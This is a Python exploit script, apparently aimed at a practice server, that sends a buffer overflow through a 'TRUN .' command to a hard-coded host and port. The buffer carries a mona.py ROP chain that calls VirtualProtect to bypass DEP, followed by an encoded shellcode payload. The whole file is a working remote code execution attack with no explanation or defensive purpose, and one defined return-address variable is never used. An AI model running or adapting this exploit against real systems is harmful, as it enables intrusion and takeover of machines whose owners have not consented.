#!/usr/bin/python
import socket
import struct
import sys
server = '192.168.122.61'
sport = 9999
shellcode =  b""
shellcode += b"\xbe\x9a\x4a\xfe\x5c\xdb\xca\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x5b\x31\x73\x14\x83\xc3\x04"
shellcode += b"\x03\x73\x10\x78\xbf\x02\xb4\xfe\x40\xfb\x45"
shellcode += b"\x9e\xc9\x1e\x74\x9e\xae\x6b\x27\x2e\xa4\x3e"
shellcode += b"\xc4\xc5\xe8\xaa\x5f\xab\x24\xdc\xe8\x01\x13"
shellcode += b"\xd3\xe9\x39\x67\x72\x6a\x43\xb4\x54\x53\x8c"
shellcode += b"\xc9\x95\x94\xf0\x20\xc7\x4d\x7f\x96\xf8\xfa"
shellcode += b"\x35\x2b\x72\xb0\xd8\x2b\x67\x01\xdb\x1a\x36"
shellcode += b"\x19\x82\xbc\xb8\xce\xbf\xf4\xa2\x13\x85\x4f"
shellcode += b"\x58\xe7\x72\x4e\x88\x39\x7b\xfd\xf5\xf5\x8e"
shellcode += b"\xff\x32\x31\x70\x8a\x4a\x41\x0d\x8d\x88\x3b"
shellcode += b"\xc9\x18\x0b\x9b\x9a\xbb\xf7\x1d\x4f\x5d\x73"
shellcode += b"\x11\x24\x29\xdb\x36\xbb\xfe\x57\x42\x30\x01"
shellcode += b"\xb8\xc2\x02\x26\x1c\x8e\xd1\x47\x05\x6a\xb4"
shellcode += b"\x78\x55\xd5\x69\xdd\x1d\xf8\x7e\x6c\x7c\x95"
shellcode += b"\xb3\x5d\x7f\x65\xdb\xd6\x0c\x57\x44\x4d\x9b"
shellcode += b"\xdb\x0d\x4b\x5c\x6d\x19\x6c\xb2\xd5\x49\x92"
shellcode += b"\x33\x26\x40\x51\x67\x76\xfa\x70\x08\x1d\xfa"
shellcode += b"\x7d\xdd\x88\xf0\xe9\x1e\xe4\x7e\x84\xf6\xf7"
shellcode += b"\x7e\x49\x5b\x71\x98\x39\x33\xd1\x34\xfa\xe3"
shellcode += b"\x91\xe4\x92\xe9\x1d\xdb\x83\x11\xf4\x74\x29"
shellcode += b"\xfe\xa1\x2d\xc6\x67\xe8\xa5\x77\x67\x26\xc0"
shellcode += b"\xb8\xe3\xc3\x35\x76\x04\xa1\x25\x6f\x73\x49"
shellcode += b"\xb5\x70\x16\x49\xdf\x74\xb0\x1e\x77\x77\xe5"
shellcode += b"\x69\xd8\x88\xc0\xe9\x1e\x76\x95\xdb\x55\x41"
shellcode += b"\x03\x64\x01\xae\xc3\x64\xd1\xf8\x89\x64\xb9"
shellcode += b"\x5c\xea\x36\xdc\xa2\x27\x2b\x4d\x37\xc8\x1a"
shellcode += b"\x22\x90\xa0\xa0\x1d\xd6\x6e\x5a\x48\x64\x68"
shellcode += b"\xa4\x0f\x43\xd1\xcd\xef\xd3\xe1\x0d\x85\xd3"
shellcode += b"\xb1\x65\x52\xfb\x3e\x46\x9b\xd6\x16\xce\x16"
shellcode += b"\xb7\xd5\x6f\x27\x92\xb8\x31\x28\x11\x61\xc1"
shellcode += b"\x53\x5a\x96\x22\xa4\x72\xf3\x22\xa5\x7a\x05"
shellcode += b"\x1e\x70\x43\x73\x61\x41\xf0\x9c\x7c\x6f\x0d"
shellcode += b"\x35\xd9\xfa\xac\x58\xda\xd1\xf3\x64\x59\xd3"
shellcode += b"\x8b\x92\x41\x96\x8e\xdf\xc5\x4b\xe3\x70\xa0"
shellcode += b"\x6b\x50\x70\xe1"

def create_rop_chain():

  # rop chain generated with mona.py - www.corelan.be
  rop_gadgets = [
    #[---INFO:gadgets_to_set_esi:---]
    0x760e5e81,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
    0x75bcfd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
    #[---INFO:gadgets_to_set_ebp:---]
    0x7608c512,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0x625011bb,  # & jmp esp [essfunc.dll]
    #[---INFO:gadgets_to_set_ebx:---]
    0x760ba837,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
    0xfffffdff,  # Value to negate, will become 0x00000201
    0x7635dae9,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0x75bcf9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    #[---INFO:gadgets_to_set_edx:---]
    0x76360991,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0xffffffc0,  # Value to negate, will become 0x00000040
    0x75bd4cbd,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
    0x75a81110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    #[---INFO:gadgets_to_set_ecx:---]
    0x762ed738,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0x625048bc,  # &Writable location [essfunc.dll]
    #[---INFO:gadgets_to_set_edi:---]
    0x762e41eb,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0x762f1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
    #[---INFO:gadgets_to_set_eax:---]
    0x76333dbf,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    0x90909090,  # nop
    #[---INFO:pushad:---]
    0x777827c4,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
  ]
  return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()
prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
brk = '\xcc'
padding = 'F' * (3000 - 2006 - len(rop_chain) - 16 - len(shellcode))
attack = prefix + rop_chain + nopsled + shellcode + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
print "Sending ROP Chain with length ",len(rop_chain)
print "Sending Payload with length ",len(shellcode)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
